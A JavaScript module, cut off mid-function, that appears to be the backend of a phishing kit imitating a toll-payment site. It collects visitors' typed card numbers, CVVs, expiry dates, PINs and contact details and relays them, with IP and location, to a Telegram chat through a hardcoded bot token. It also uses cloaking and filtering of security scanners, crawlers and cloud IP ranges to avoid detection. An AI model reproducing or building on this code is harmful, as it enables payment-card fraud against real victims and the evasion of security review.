/**
 * Telegram Logger - НОВАЯ ВЕРСИЯ
 * Полное отслеживание действий пользователей с базой данных
 * Фильтрация белой страницы (клоаки)
 */

const https = require('https');
const logger = require('./logger');
const db = require('./database');
const deviceDetector = require('./device-detector');

// Инициализировать БД при загрузке модуля
// Если БД уже инициализирована, это безопасно (проверка внутри initDatabase)
try {
  if (!db.db()) {
    db.initDatabase();
  }
} catch (error) {
  logger.error('[TG] Failed to initialize database:', error.message);
  // Продолжаем работу даже если БД не инициализирована
}

// Telegram Bot Configuration
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8528667086:AAHrl7LOf7kimNCwfFNOFMPVkWgGTv_KUuM';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1003580814172';

// ============ НАСТРОЙКИ ФИЛЬТРАЦИИ ============
// Отправлять уведомления ТОЛЬКО при наличии активности пользователя
// Если true - "Нет активности" посетители не будут отправлять первое уведомление
// Уведомление придёт только когда пользователь совершит действие
const ONLY_NOTIFY_WITH_ACTIVITY = process.env.ONLY_NOTIFY_WITH_ACTIVITY === 'true' || true;

// Минимальное время на странице (мс) перед отправкой уведомления (если ONLY_NOTIFY_WITH_ACTIVITY=false)
const MIN_TIME_BEFORE_NOTIFY = parseInt(process.env.MIN_TIME_BEFORE_NOTIFY) || 5000; // 5 секунд

// Белая страница (клоака) - домены которые НЕ должны логироваться
const WHITE_PAGE_DOMAINS = [
  'm50toll-lrlsh.com',
];

// Проверить является ли запрос с белой страницы
function isWhitePageRequest(req) {
  const host = req.headers.host || '';
  const referer = req.headers.referer || '';
  
  // Проверить host
  for (const domain of WHITE_PAGE_DOMAINS) {
    if (host.includes(domain) || referer.includes(domain)) {
      return true;
    }
  }
  
  return false;
}

// Store active sessions: sessionId -> { messageId, visitorId, sessionDbId, startTime }
const activeSessions = new Map();

// Clean old sessions after 30 minutes
const SESSION_TIMEOUT = 30 * 60 * 1000;

// Bot/Crawler User-Agent patterns to ignore (РАСШИРЕННЫЙ СПИСОК)
const BOT_PATTERNS = [
  // Поисковые боты
  /googlebot/i, /bingbot/i, /yandexbot/i, /baiduspider/i, /duckduckbot/i,
  /slurp/i, /msnbot/i, /teoma/i, /gigabot/i, /scrubby/i,
  
  // HTTP клиенты и библиотеки
  /python-requests/i, /python-urllib/i, /aiohttp/i, /httpx/i,
  /curl\//i, /wget\//i, /httpie/i, /postman/i, /insomnia/i,
  /axios/i, /node-fetch/i, /got\//i, /request\//i, /undici/i,
  /java\//i, /okhttp/i, /apache-httpclient/i, /jersey/i,
  /go-http-client/i, /libwww-perl/i, /lwp-/i, /php\//i, /guzzle/i,
  /ruby/i, /mechanize/i, /scrapy/i, /colly/i,
  /amphp/i, /http-client/i, // amphp/http-client который виден в ваших логах
  
  // Общие паттерны ботов
  /bot\b/i, /crawler/i, /spider/i, /scraper/i, /fetcher/i,
  /monitor/i, /checker/i, /validator/i, /scanner/i, /probe/i,
  
  // Headless браузеры
  /headless/i, /phantom/i, /selenium/i, /puppeteer/i, /playwright/i,
  /chromedriver/i, /webdriver/i, /nightwatch/i, /cypress/i,
  
  // SEO и аналитика
  /semrush/i, /ahrefs/i, /moz\.com/i, /majestic/i, /screaming/i,
  /seokicks/i, /sistrix/i, /linkdex/i, /blexbot/i,
  
  // Соцсети и мессенджеры (превью ссылок)
  /facebookexternalhit/i, /twitterbot/i, /telegrambot/i, /whatsapp/i,
  /linkedinbot/i, /slackbot/i, /discordbot/i, /skype/i,
  
  // Мониторинг и безопасность
  /uptimerobot/i, /pingdom/i, /site24x7/i, /statuscake/i,
  /newrelic/i, /datadog/i, /appdynamics/i,
  /nessus/i, /qualys/i, /nikto/i, /nmap/i, /masscan/i,
  /zgrab/i, /censys/i, /shodan/i, /zmap/i,
  
  // Пустые или подозрительные
  /^Mozilla\/5\.0$/i, /^\s*$/, /^-$/i,
  /compatible;\s*$/i, // Только "compatible;" без ничего
];

// Suspicious paths that scanners try to access (РАСШИРЕННЫЙ)
const SUSPICIOUS_PATHS = [
  /\.git\//i, /\.env/i, /\.htaccess/i, /\.htpasswd/i,
  /wp-admin/i, /wp-login/i, /wp-content/i, /wp-includes/i, /wordpress/i,
  /phpmyadmin/i, /phpinfo/i, /adminer/i, /mysql/i,
  /\.sql$/i, /\.bak$/i, /\.backup$/i, /\.old$/i, /\.orig$/i,
  /\.config$/i, /\.ini$/i, /\.log$/i, /\.tmp$/i,
  /admin\//i, /administrator/i, /login\.php/i, /setup-config/i,
  /xmlrpc\.php/i, /cgi-bin/i, /shell/i, /cmd/i,
  /\.asp$/i, /\.aspx$/i, /\.jsp$/i, // Неправильные расширения для Node.js сайта
  /robots\.txt/i, /sitemap\.xml/i, // Поисковые боты
];

// Известные IP диапазоны ботнетов и датацентров (первые октеты)
const SUSPICIOUS_IP_PREFIXES = [
  '43.130.',  // Tencent Cloud (часто боты)
  '43.131.',
  '43.132.',
  '43.133.',
  '43.134.',
  '43.135.',
  '34.28.',   // Google Cloud (часто сканеры)
  '35.', // Google Cloud
  '34.', // AWS/GCP
  '52.', // AWS
  '54.', // AWS  
  '18.', // AWS
  '3.', // AWS
  '13.', // AWS
  '23.92.', // OVH датацентр
  '87.250.', // Yandex
  '66.249.', // Google
  '157.55.', // Microsoft/Bing
  '40.77.',  // Microsoft
  '207.46.', // Microsoft
  '114.119.', // Baidu
  '180.76.', // Baidu
  '220.181.', // Baidu
  '123.125.', // Baidu
];

// Функция проверки подозрительного IP
function isSuspiciousIP(ip) {
  if (!ip) return false;
  return SUSPICIOUS_IP_PREFIXES.some(prefix => ip.startsWith(prefix));
}

setInterval(() => {
  const now = Date.now();
  for (const [sessionId, session] of activeSessions.entries()) {
    if (now - session.startTime > SESSION_TIMEOUT) {
      activeSessions.delete(sessionId);
      // Очистить дедупликацию для этой сессии
      eventDeduplication.delete(sessionId);
    }
  }
  
  // Очистить старые записи дедупликации (старше 1 часа)
  const oneHourAgo = now - (60 * 60 * 1000);
  for (const [sessionId, sessionEvents] of eventDeduplication.entries()) {
    if (!activeSessions.has(sessionId)) {
      eventDeduplication.delete(sessionId);
      continue;
    }
    for (const [eventKey, timestamp] of sessionEvents.entries()) {
      if (now - timestamp > oneHourAgo) {
        sessionEvents.delete(eventKey);
      }
    }
  }
}, 60 * 1000);

// Rate limiting for Telegram API - ADAPTIVE
let lastTelegramRequest = 0;
let telegramRetryAfter = 0; // Время ожидания от Telegram API
const TELEGRAM_MIN_INTERVAL = 500; // Минимум 500мс между запросами (увеличено!)
const TELEGRAM_MAX_RETRIES = 2;

async function waitForRateLimit() {
  const now = Date.now();
  
  // Если Telegram сказал "retry after" - ждём
  if (telegramRetryAfter > now) {
    const waitTime = telegramRetryAfter - now;
    logger.debug(`[TG] Rate limited, waiting ${waitTime}ms`);
    await new Promise(resolve => setTimeout(resolve, waitTime));
  }
  
  const elapsed = Date.now() - lastTelegramRequest;
  if (elapsed < TELEGRAM_MIN_INTERVAL) {
    await new Promise(resolve => setTimeout(resolve, TELEGRAM_MIN_INTERVAL - elapsed));
  }
  lastTelegramRequest = Date.now();
}

// Парсинг "retry after" из ошибки Telegram
function parseRetryAfter(errorMessage) {
  const match = errorMessage && errorMessage.match(/retry after (\d+)/i);
  if (match) {
    return parseInt(match[1], 10) * 1000; // конвертировать в миллисекунды
  }
  return 0;
}

/**
 * Truncate message to Telegram limit (4096 chars)
 */
function truncateMessage(text, maxLength = 4000) {
  if (!text || text.length <= maxLength) return text;
  // Find a good break point
  const truncated = text.substring(0, maxLength - 50);
  const lastBlockquote = truncated.lastIndexOf('</blockquote>');
  if (lastBlockquote > maxLength - 500) {
    return truncated.substring(0, lastBlockquote) + '\n... (ещё действия)</blockquote>';
  }
  return truncated + '\n<i>... (сообщение обрезано)</i>';
}

/**
 * Send message to Telegram (NEVER throws - returns null on error)
 */
async function sendTelegramMessage(text, parseMode = 'HTML') {
  try {
    await waitForRateLimit();
    
    // Truncate if too long
    text = truncateMessage(text);
    
    return new Promise((resolve) => {
      const data = JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: parseMode,
        disable_web_page_preview: true,
      });

      const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(data),
        },
      };

      const req = https.request(options, (res) => {
        let body = '';
        res.on('data', (chunk) => body += chunk);
        res.on('end', () => {
          try {
            const result = JSON.parse(body);
            if (result.ok) {
              resolve(result.result);
            } else {
              // НЕ выбрасываем ошибку - просто логируем и возвращаем null
              logger.warn('[TG] Send failed:', result.description);
              
              // Обработать rate limit
              const retryMs = parseRetryAfter(result.description);
              if (retryMs > 0) {
                telegramRetryAfter = Date.now() + retryMs + 1000; // +1с запас
                logger.warn(`[TG] Rate limited, will retry after ${retryMs}ms`);
              }
              
              resolve(null);
            }
          } catch (e) {
            logger.warn('[TG] Parse error:', e.message);
            resolve(null);
          }
        });
      });

      req.on('error', (err) => {
        logger.warn('[TG] Request error:', err.message);
        resolve(null);
      });
      
      req.setTimeout(10000, () => {
        req.destroy();
        logger.warn('[TG] Request timeout');
        resolve(null);
      });
      
      req.write(data);
      req.end();
    });
  } catch (err) {
    logger.warn('[TG] sendTelegramMessage exception:', err.message);
    return null;
  }
}

/**
 * Edit existing message in Telegram (NEVER throws - returns null on error)
 */
async function editTelegramMessage(messageId, text, parseMode = 'HTML') {
  try {
    await waitForRateLimit();
    
    // Truncate if too long
    text = truncateMessage(text);
    
    return new Promise((resolve) => {
      const data = JSON.stringify({
        chat_id: CHAT_ID,
        message_id: messageId,
        text: text,
        parse_mode: parseMode,
        disable_web_page_preview: true,
      });

      const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${BOT_TOKEN}/editMessageText`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(data),
        },
      };

      const req = https.request(options, (res) => {
        let body = '';
        res.on('data', (chunk) => body += chunk);
        res.on('end', () => {
          try {
            const result = JSON.parse(body);
            if (result.ok) {
              resolve(result.result);
            } else {
              // НЕ выбрасываем ошибку - логируем и возвращаем null
              if (result.description && result.description.includes('message is not modified')) {
                resolve(null); // Это нормально - сообщение не изменилось
              } else {
                logger.warn('[TG] Edit failed:', result.description);
                
                // Обработать rate limit
                const retryMs = parseRetryAfter(result.description);
                if (retryMs > 0) {
                  telegramRetryAfter = Date.now() + retryMs + 1000;
                  logger.warn(`[TG] Rate limited, will retry after ${retryMs}ms`);
                }
                
                resolve(null);
              }
            }
          } catch (e) {
            logger.warn('[TG] Edit parse error:', e.message);
            resolve(null);
          }
        });
      });

      req.on('error', (err) => {
        logger.warn('[TG] Edit request error:', err.message);
        resolve(null);
      });
      
      req.setTimeout(10000, () => {
        req.destroy();
        logger.warn('[TG] Edit request timeout');
        resolve(null);
      });
      
      req.write(data);
      req.end();
    });
  } catch (err) {
    logger.warn('[TG] editTelegramMessage exception:', err.message);
    return null;
  }
}

/**
 * Escape HTML для Telegram
 */
function escapeHtml(str) {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Получить название страницы на русском
 */
function getPageNameRu(path) {
  if (!path || path === '/' || path === '') return '🏠 Главная';
  
  const cleanPath = path.split('?')[0].replace(/^\//, '').replace(/\/$/, '');
  
  const translations = {
    'pay-toll': '💰 Pay a Toll (Оплата проезда)',
    'pay-penalty': '⚠️ Pay a Penalty (Оплата штрафа)',
    'user/login': '🔐 Вход в аккаунт',
    'user/register': '📝 Регистрация',
    'login': '🔐 Вход',
    'register': '📝 Регистрация',
    'account': '👤 Личный кабинет',
    'dashboard': '📊 Dashboard',
    'contact': '📞 Контакты',
    'about': 'ℹ️ О нас',
    'help': '❓ Помощь',
    'faq': '❓ FAQ',
    'appeal': '📋 Апелляция',
  };
  
  if (translations[cleanPath]) {
    return translations[cleanPath];
  }
  
  if (cleanPath.includes('pay-penalty')) return '⚠️ Pay a Penalty (Оплата штрафа)';
  if (cleanPath.includes('pay-toll')) return '💰 Pay a Toll (Оплата проезда)';
  if (cleanPath.includes('appeal')) return '📋 Апелляция';
  if (cleanPath.includes('login')) return '🔐 Вход';
  if (cleanPath.includes('register')) return '📝 Регистрация';
  
  return cleanPath.charAt(0).toUpperCase() + cleanPath.slice(1);
}

/**
 * Получить название поля на русском
 */
function getFieldNameRu(fieldCode) {
  const fieldNames = {
    'vh': '🚗 Номер авто',
    'vehicle_registration': '🚗 Номер авто',
    'vrn': '🚗 Номер авто',
    'pin': '🔢 PIN код',
    'notice': '📄 Notice Number',
    'journey': '🛣️ Journeys to Pay',
    'journey_ref': '🛣️ Journey Reference',
    'journey_reference': '🛣️ Journey Reference',
    'em': '📧 Email',
    'email': '📧 Email',
    'cd': '💳 Номер карты',
    'card': '💳 Номер карты',
    'cv': '🔒 CVV',
    'cvv': '🔒 CVV',
    'ex': '📅 Срок действия',
    'nm': '👤 Имя владельца',
    'ph': '📱 Телефон',
    'phone': '📱 Телефон',
    'ot': '📝 Другое поле',
    'amount': '💶 Сумма',
  };
  
  return fieldNames[fieldCode] || fieldNames[fieldCode.toLowerCase()] || `📝 ${fieldCode}`;
}

/**
 * Форматировать сообщение для Telegram - НОВЫЙ ФОРМАТ
 */
async function formatTelegramMessage(sessionId, visitorId) {
  try {
    // Получить данные из БД
    const visitor = db.getVisitorStats(visitorId);
    const session = db.getSession(sessionId);
    const actions = db.getSessionActions(sessionId);
    
    // #region agent log
    fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:formatTelegramMessage',message:'Format message start',data:{visitorId:visitorId,visitorExists:!!visitor,visitorCountry:visitor?.country,visitorCity:visitor?.city},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'K'})}).catch(()=>{});
    // #endregion
    
    if (!visitor || !session) {
      return null;
    }
    
    // Определить тип устройства
    const deviceTypeRu = {
      'phone': '📱 Телефон',
      'desktop': '💻 ПК',
      'tablet': '📱 Планшет',
      'unknown': '❓ Неизвестно'
    }[visitor.device_type] || '❓ Неизвестно';
    
    // Построить сообщение
    let message = `<b>Новый посетитель</b>\n\n`;
    
    // Количество посещений
    message += `Количество посещений: <code>${visitor.visit_count}</code>\n`;
    
    // Устройство
    message += `Устройство: ${deviceTypeRu}\n`;
    
    // IP
    message += `IP: <code>${escapeHtml(visitor.ip)}</code>\n`;
    
    // Дополнительная информация
    if (visitor.browser && visitor.browser !== 'Unknown') {
      message += `Браузер: <code>${escapeHtml(visitor.browser)}</code>\n`;
    }
    if (visitor.os && visitor.os !== 'Unknown') {
      message += `ОС: <code>${escapeHtml(visitor.os)}</code>\n`;
    }
    // ВАЖНО: Показывать страну если она есть (даже если Local, но не Unknown)
    // #region agent log
    fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:formatTelegramMessage',message:'Checking country in message',data:{visitorId:visitorId,country:visitor.country,countryType:typeof visitor.country,isUnknown:visitor.country === 'Unknown',isNull:visitor.country === null,willShow:visitor.country && visitor.country !== 'Unknown'},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'M'})}).catch(()=>{});
    // #endregion
    
    if (visitor.country && visitor.country !== 'Unknown' && visitor.country !== 'null' && visitor.country !== null) {
      message += `Страна: <code>${escapeHtml(visitor.country)}</code>\n`;
      if (visitor.city && visitor.city !== 'Unknown' && visitor.city !== 'Local' && visitor.city !== '' && visitor.city !== 'null' && visitor.city !== null) {
        message += `Город: <code>${escapeHtml(visitor.city)}</code>\n`;
      }
    } else {
      // #region agent log
      fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:formatTelegramMessage',message:'Country NOT shown in message',data:{visitorId:visitorId,country:visitor.country,countryType:typeof visitor.country,reason:!visitor.country ? 'no country' : visitor.country === 'Unknown' ? 'is Unknown' : visitor.country === 'null' ? 'is null string' : visitor.country === null ? 'is null' : 'other'},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'M'})}).catch(()=>{});
      // #endregion
    }
    
    message += `\n<b>Движение клиента:</b>\n`;
    
    if (!actions || actions.length === 0) {
      message += `<blockquote>Нет активности</blockquote>`;
    } else {
      message += `<blockquote>`;
      
      // Limit to last 15 actions to prevent MESSAGE_TOO_LONG
      const MAX_ACTIONS = 15;
      const limitedActions = actions.length > MAX_ACTIONS 
        ? actions.slice(-MAX_ACTIONS) 
        : actions;
      
      const movementItems = [];
      
      if (actions.length > MAX_ACTIONS) {
        movementItems.push(`... (${actions.length - MAX_ACTIONS} предыдущих действий)`);
      }
      
      for (const action of limitedActions) {
        let item = '';
        
        switch (action.action_type) {
          case 'page_view':
          case 'navigation':
            if (action.page_path) {
              item = getPageNameRu(action.page_path);
            } else if (action.page_name) {
              item = action.page_name;
            } else {
              item = '🏠 Главная';
            }
            break;
            
          case 'form_fill':
          case 'form_input':
          case 'form_complete':
            if (action.field_name) {
              const fieldName = getFieldNameRu(action.field_name);
              const fieldValue = action.field_value ? escapeHtml(action.field_value.substring(0, 50)) : '';
              if (fieldValue) {
                item = `✏️ Заполняет ${fieldName}: <code>${fieldValue}</code>`;
              } else {
                item = `✏️ Заполняет ${fieldName}`;
              }
            }
            break;
            
          case 'button_click':
          case 'pay_button_click':
            const buttonText = action.button_text || 'Кнопка';
            item = `🖱️ Нажал кнопку: <code>${escapeHtml(buttonText)}</code>`;
            break;
            
          case 'form_submit':
            item = `📤 Отправил форму`;
            break;
            
          default:
            if (action.page_name) {
              item = action.page_name;
            }
        }
        
        if (item) {
          movementItems.push(item);
        }
      }
      
      if (movementItems.length === 0) {
        message += `Нет активности`;
      } else {
        message += movementItems.join('\n');
      }
      
      message += `</blockquote>`;
    }
    
    return message;
    
  } catch (error) {
    logger.error('[TG] Format message error:', error.message);
    return null;
  }
}

/**
 * Получить реальный IP адрес клиента
 * Приоритет: X-Real-IP > X-Forwarded-For (первый IP) > req.ip > remoteAddress
 */
function getClientIP(req) {
  // #region agent log
  fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:getClientIP',message:'IP extraction start',data:{xRealIP:req.headers['x-real-ip'],xForwardedFor:req.headers['x-forwarded-for'],reqIP:req.ip,remoteAddress:req.socket?.remoteAddress},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
  // #endregion
  
  // 1. X-Real-IP - самый надежный, устанавливается Nginx напрямую
  let ip = req.headers['x-real-ip'];
  if (ip) {
    ip = ip.trim();
    if (ip && ip !== '::1' && !ip.startsWith('127.')) {
      // #region agent log
      fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:getClientIP',message:'IP from X-Real-IP',data:{ip:ip},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'A'})}).catch(()=>{});
      // #endregion
      return ip;
    }
  }
  
  // 2. X-Forwarded-For - может содержать цепочку IP (клиент, прокси1, прокси2)
  // Берем первый IP (реальный клиент)
  const xForwardedFor = req.headers['x-forwarded-for'];
  if (xForwardedFor) {
    const ips = xForwardedFor.split(',').map(ip => ip.trim()).filter(ip => ip);
    // Берем первый валидный IP (не локальный)
    for (const candidateIp of ips) {
      if (candidateIp && candidateIp !== '::1' && !candidateIp.startsWith('127.') && 
          !candidateIp.startsWith('192.168.') && !candidateIp.startsWith('10.') && 
          !candidateIp.match(/^172\.(1[6-9]|2[0-9]|3[01])\./)) {
        // #region agent log
        fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:getClientIP',message:'IP from X-Forwarded-For',data:{ip:candidateIp,allIPs:ips},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'})}).catch(()=>{});
        // #endregion
        return candidateIp;
      }
    }
    // Если все локальные, вернуть первый
    if (ips.length > 0) {
      // #region agent log
      fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:getClientIP',message:'IP from X-Forwarded-For (local fallback)',data:{ip:ips[0],allIPs:ips},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'B'})}).catch(()=>{});
      // #endregion
      return ips[0];
    }
  }
  
  // 3. req.ip - может быть установлен Express если trust proxy настроен
  if (req.ip && req.ip !== '::1' && !req.ip.startsWith('127.')) {
    // #region agent log
    fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:getClientIP',message:'IP from req.ip',data:{ip:req.ip},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'C'})}).catch(()=>{});
    // #endregion
    return req.ip;
  }
  
  // 4. remoteAddress - последний вариант
  const remoteAddr = req.socket?.remoteAddress || req.connection?.remoteAddress;
  if (remoteAddr) {
    // Убрать IPv6 префикс если есть
    const cleanIp = remoteAddr.replace(/^::ffff:/, '');
    if (cleanIp && cleanIp !== '::1' && !cleanIp.startsWith('127.')) {
      // #region agent log
      fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:getClientIP',message:'IP from remoteAddress',data:{ip:cleanIp,original:remoteAddr},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'D'})}).catch(()=>{});
      // #endregion
      return cleanIp;
    }
  }
  
  // #region agent log
  fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:getClientIP',message:'IP not found, returning Unknown',data:{},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'E'})}).catch(()=>{});
  // #endregion
  return 'Unknown';
}

/**
 * Генерировать session ID
 */
function getSessionId(req) {
  const cookies = req.headers.cookie || '';
  const sessionMatch = cookies.match(/SESS[a-f0-9]+=[a-zA-Z0-9%_-]+/);
  
  if (sessionMatch) {
    return 'drupal_' + sessionMatch[0].substring(0, 20);
  }
  
  const ip = getClientIP(req);
  const ua = (req.headers['user-agent'] || 'unknown').substring(0, 50);
  const hash = Buffer.from(ip + ua).toString('base64').substring(0, 12);
  return 'ip_' + hash;
}

/**
 * Проверить является ли User-Agent ботом
 */
function isBot(userAgent) {
  if (!userAgent || userAgent.trim() === '') return true;
  return BOT_PATTERNS.some(pattern => pattern.test(userAgent));
}

/**
 * Проверить является ли путь подозрительным
 */
function isSuspiciousPath(path) {
  if (!path) return false;
  return SUSPICIOUS_PATHS.some(pattern => pattern.test(path));
}

// Дедупликация событий: sessionId -> Set<eventKey>
const eventDeduplication = new Map();
const DEDUP_WINDOW = 3000; // 3 секунды

/**
 * Создать ключ для дедупликации события
 */
function getEventKey(eventData) {
  const type = eventData.type || 'unknown';
  const field = eventData.field || '';
  const value = eventData.value || '';
  const buttonText = eventData.buttonText || eventData.button_text || '';
  const path = eventData.path || '';
  
  // Для page_view учитываем путь, для остальных - тип+поле+значение
  if (type === 'page_view' || type === 'navigation') {
    return `${type}:${path}`;
  }
  
  return `${type}:${field}:${value || buttonText}`;
}

/**
 * Проверить является ли событие дубликатом
 */
function isDuplicateEvent(sessionId, eventKey) {
  if (!eventDeduplication.has(sessionId)) {
    eventDeduplication.set(sessionId, new Map());
  }
  
  const sessionEvents = eventDeduplication.get(sessionId);
  const now = Date.now();
  
  // Очистить старые события
  for (const [key, timestamp] of sessionEvents.entries()) {
    if (now - timestamp > DEDUP_WINDOW) {
      sessionEvents.delete(key);
    }
  }
  
  // Проверить дубликат
  if (sessionEvents.has(eventKey)) {
    return true; // Дубликат
  }
  
  // Сохранить новое событие
  sessionEvents.set(eventKey, now);
  return false; // Не дубликат
}

/**
 * Отследить событие (действие пользователя)
 */
async function trackEvent(sessionId, eventData, meta = {}) {
  try {
    // Пропустить если нет сессии
    const activeSession = activeSessions.get(sessionId);
    if (!activeSession) {
      logger.debug(`[TrackEvent] Session not found: ${sessionId}. Event type: ${eventData.type}. Active sessions: ${activeSessions.size}`);
      return;
    }
    
    logger.debug(`[TrackEvent] Processing event: type=${eventData.type}, session=${sessionId}`);
    
    // ДЕДУПЛИКАЦИЯ: Пропустить дубликаты
    const eventKey = getEventKey(eventData);
    if (isDuplicateEvent(sessionId, eventKey)) {
      return; // Пропустить дубликат
    }
    
    // Пропустить повторные page_view на той же странице
    if (eventData.type === 'page_view' && eventData.path === activeSession.lastPage) {
      return; // Уже на этой странице
    }
    
    // Добавить действие в БД
    db.addAction(
      sessionId,
      activeSession.visitorId,
      {
        type: eventData.type || 'unknown',
        path: eventData.path,
        page: eventData.page,
        field: eventData.field,
        value: eventData.value,
        buttonText: eventData.buttonText || eventData.button_text,
        data: eventData
      }
    );
    
    // Обновить счетчик действий
    db.updateSession(sessionId, {
      actionCount: activeSession.actionCount + 1,
      lastPage: eventData.path || activeSession.lastPage
    });
    
    activeSession.actionCount++;
    activeSession.lastPage = eventData.path || activeSession.lastPage;
    
    // Обновить сообщение в Telegram (с задержкой для батчинга)
    // УВЕЛИЧЕНА задержка до 5 секунд для предотвращения rate limit
    if (!activeSession.updateTimer) {
      activeSession.updateTimer = setTimeout(async () => {
        activeSession.updateTimer = null;
        try {
          const messageText = await formatTelegramMessage(sessionId, activeSession.visitorId);
          if (messageText && activeSession.messageId) {
            await editTelegramMessage(activeSession.messageId, messageText);
          }
        } catch (err) {
          // Не выбрасываем ошибку - просто логируем
          logger.warn(`[TrackEvent] Telegram update failed (non-critical): ${err.message}`);
        }
      }, 5000); // Батчинг: обновляем раз в 5 секунд (сильно снижает rate limit)
    }
    
  } catch (error) {
    logger.error('[TG] Track event error:', error.message);
  }
}

/**
 * Отследить запрос страницы
 */
async function trackPageRequest(req) {
  try {
    // ПРОВЕРКА: Пропустить если это белая страница (клоака)
    if (isWhitePageRequest(req)) {
      return;
    }
    
    const path = req.url || req.path || '/';
    
    // Пропустить статические файлы
    if (path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot|map|webp|pdf|zip|mp4|mp3|avi|mov)(\?|$)/i)) {
      return;
    }
    
    // Пропустить asset директории
    if (path.match(/^\/(sites\/default\/files|themes|modules|libraries|assets|images|media|uploads|static)\//i)) {
      return;
    }
    
    if (path.startsWith('/api/') || path.startsWith('/_') || path === '/__track') {
      return;
    }
    
    // Пропустить tracking endpoints
    if (path.startsWith('/g/collect') || path.includes('collect')) {
      return;
    }
    
    // Пропустить подозрительные пути
    if (isSuspiciousPath(path)) {
      return;
    }
    
    const sessionId = getSessionId(req);
    const ip = getClientIP(req);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    // #region agent log
    fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:trackPageRequest',message:'Before device info',data:{ip:ip,userAgent:userAgent.substring(0,50)},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'F'})}).catch(()=>{});
    // #endregion
    
    // Получить информацию об устройстве
    const deviceInfo = await deviceDetector.getFullDeviceInfo(ip, userAgent);
    
    // #region agent log
    fetch('http://127.0.0.1:7242/ingest/9c6f37bb-c9a1-491e-95d3-10def06c3fda',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({location:'telegram-logger-new.js:trackPageRequest',message:'After device info',data:{ip:ip,country:deviceInfo.country,city:deviceInfo.city,deviceType:deviceInfo.deviceType},timestamp:Date.now(),sessionId:'debug-session',runId:'run1',hypothesisId:'F'})}).catch(()=>{});
    // #endregion
    
    // КРИТИЧЕСКИ ВАЖНО: Проверить является ли это новым посещением
    // Нужно проверить не только активную сессию в памяти, но и в БД
    // Если для этого IP уже есть сессия в БД - это не новое посещение
    let activeSession = activeSessions.get(sessionId);
    
    // Проверить в БД, есть ли уже сессия для этого посетителя
    let isNewVisit = !activeSession;
    if (isNewVisit) {
      // Проверить в БД по IP - если посетитель уже был, проверить его последнюю сессию
      try {
        const dbInstance = db.db();
        if (dbInstance) {
          // Найти посетителя по IP
          const existingVisitor = dbInstance.prepare('SELECT id FROM visitors WHERE ip = ?').get(ip);
          if (existingVisitor) {
            // Проверить, есть ли активная сессия для этого посетителя (созданная недавно, в течение последних 30 минут)
            const thirtyMinutesAgo = Math.floor(Date.now() / 1000) - (30 * 60);
            const recentSession = dbInstance.prepare(`
              SELECT id FROM visitor_sessions 
              WHERE visitor_id = ? AND start_time > ?
              ORDER BY start_time DESC LIMIT 1
            `).get(existingVisitor.id, thirtyMinutesAgo);
            
            // Если есть недавняя сессия - это не новое посещение
            if (recentSession) {
              isNewVisit = false;
            }
          }
        }
      } catch (error) {
        logger.error('[TG] Error checking existing session:', error.message);
